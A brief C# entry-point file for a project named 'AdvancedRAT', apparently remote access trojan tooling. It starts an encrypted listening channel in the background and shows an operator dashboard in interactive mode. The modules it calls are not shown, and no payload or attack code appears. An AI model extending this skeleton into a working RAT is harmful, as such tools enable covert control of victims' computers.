using System;
using System.Threading.Tasks;

namespace AdvancedRAT
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Initialize core modules
            Task.Run(() => Core.Communication.EncryptedChannel.StartListening());
            
            // Start UI if in interactive mode
            if (Environment.UserInteractive)
            {
                UI.ClientConsole.Dashboard.Show();
            }
            
            // Keep main thread alive
            Task.Delay(-1).Wait();
        }
    }
}